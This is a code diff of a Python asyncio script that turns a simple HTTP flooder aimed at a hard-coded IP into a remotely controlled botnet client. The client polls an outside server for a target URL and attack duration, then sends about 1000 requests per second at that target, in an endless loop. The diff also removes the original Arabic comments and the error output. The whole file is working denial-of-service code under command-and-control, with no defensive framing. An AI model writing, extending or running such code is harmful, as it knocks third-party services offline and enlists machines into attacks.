@@ -1,45 +1,63 @@
 import aiohttp
 import asyncio
 import time
+import xml.etree.ElementTree as ET
 
-# الإعدادات
-MAX_REQUESTS_PER_SECOND = 1000  # عدد الطلبات في الثانية
-URL = "http://198.16.110.165"  # الرابط الجديد
-CONCURRENCY = 200  # عدد المهام المتوازية
+MAX_REQUESTS_PER_SECOND = 1000
 
-# دالة لإرسال طلب غير متزامن دون التحقق من الاستجابة
-async def send_request(session):
+async def send_request(session, url):
     try:
-        # فقط إرسال الطلبات دون انتظار الاستجابة
-        async with session.get(URL):
-            pass  # لا نحتاج إلى التعامل مع الاستجابة
+        async with session.get(url):
+            pass
     except Exception as e:
-        print(f"حدث خطأ أثناء إرسال الطلب: {e}")
+        pass
 
-# دالة لإرسال العديد من الطلبات في وقت واحد
-async def send_requests_in_batch():
+async def get_instructions():
+    api_url = 'http://nrcf.medianewsonline.com/api/index.php'
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url) as response:
+                if response.status == 200:
+                    xml_data = await response.text()
+                    if xml_data:
+                        try:
+                            root = ET.fromstring(xml_data)
+                            url = root.find('url').text
+                            time_limit = int(root.find('time').text)
+                            return url, time_limit
+                        except ET.ParseError as e:
+                            return None, None
+                    else:
+                        return None, None
+                else:
+                    return None, None
+    except Exception as e:
+        return None, None
+
+async def send_requests_in_batch(url, duration):
     async with aiohttp.ClientSession() as session:
-        while True:
-            start_time = time.time()
+        start_time = time.time()
+        end_time = start_time + duration
 
-            # إرسال 1000 طلب بشكل غير متزامن باستخدام مهام asyncio
-            tasks = [send_request(session) for _ in range(MAX_REQUESTS_PER_SECOND)]
-            # تنفيذ جميع المهام (الطلبات) في وقت واحد باستخدام asyncio.gather
+        while time.time() < end_time:
+            tasks = [send_request(session, url) for _ in range(MAX_REQUESTS_PER_SECOND)]
             await asyncio.gather(*tasks)
 
-            # حساب الوقت الذي تم إنفاقه في إرسال 1000 طلب
             elapsed_time = time.time() - start_time
-
-            # حساب الطلبات في الثانية بناءً على الوقت المنقضي
             requests_per_second = MAX_REQUESTS_PER_SECOND / elapsed_time
 
-            # طباعة عدد الطلبات في الثانية في سطر واحد
-            print(f"\rالطلبات في الثانية: {requests_per_second:.2f}", end="", flush=True)
-
-            # الانتظار لتحقيق الهدف قبل بدء الجولة التالية
             if elapsed_time < 1:
-                await asyncio.sleep(1 - elapsed_time)  # الانتظار للحصول على 1 ثانية كاملة
+                await asyncio.sleep(1 - elapsed_time)
 
-# تشغيل العملية باستخدام asyncio
+async def main():
+    while True:
+        url, duration = await get_instructions()
+
+        if url and duration:
+            await send_requests_in_batch(url, duration)
+        else:
+            await asyncio.sleep(10)
+
 if __name__ == "__main__":
-    asyncio.run(send_requests_in_batch())
+    asyncio.run(main())
